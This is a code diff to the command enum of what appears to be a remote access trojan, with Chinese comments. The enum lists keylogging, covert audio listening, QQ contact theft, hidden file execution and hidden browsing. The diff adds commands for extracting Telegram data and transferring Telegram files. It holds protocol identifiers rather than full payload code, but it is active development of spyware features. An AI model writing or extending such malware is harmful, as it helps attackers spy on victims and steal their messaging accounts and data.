@@ -38,6 +38,7 @@ enum
 	COMMAND_SORT_WINDOW,            // 窗口筛选
 	
 	COMMAND_CLIENT_CLOSE,           // 控制端退出
+
 	
 	// 控制端发出的命令
 	COMMAND_ACTIVED = 0x00,			// 服务端可以激活开始工作
@@ -101,8 +102,10 @@ enum
 	COMMAND_KEYBOARD_OLKEYLOG_OFF,	//关闭在线记录	
 
 	COMMAND_AUDIO,					// 语音监听
-	COMMAND_TELEGRAM,				// 提取 T G
 	COMMAND_QQINFO,					// 好友信息
+	COMMAND_TELEGRAM,				// 提取 T G
+	COMMAND_TELEGRAM_EXTRACT,           // 提取TG数据
+	COMMAND_TELEGRAM_FILE_TRANSFER,    // Telegram 文件传输
 	COMMAND_QQDATA,					// 获取好友信息数据
 
 	COMMAND_SYSTEM,					// 系统管理（进程，窗口....）
@@ -158,6 +161,7 @@ enum
 	COMMAND_SENDFILE_HIDE,			// 隐藏运行
 	COMMAND_SENDFILE_SHOW,			// 显示运行
 	COMMAND_SENDFILE_NRUN,			// 不去运行
+	COMMAND_SENDFILE_CUSTOM,		// 不运行自定义名称
 	COMMAND_OPEN_URL_HIDE,			// 其它管理 - 隐藏打开网页
 	COMMAND_OPEN_URL_SHOW,			// 其它管理 - 显示打开网页
 	COMMAND_RENAME_REMARK,			// 重命名备注
@@ -240,9 +244,6 @@ enum
 	
 	TOKEN_AUDIO_START,				// 开始语音监听
 	TOKEN_AUDIO_DATA,				// 语音监听数据
-
-	TOKEN_TELEGRAM_START,			// 开始提取TG
-	TOKEN_TELEGRAM_DATA,			// TG代理链接
 
 	TOKEN_KEYBOARD_START,			// 键盘记录开始
 	TOKEN_KEYBOARD_DATA,			// 键盘记录的数据
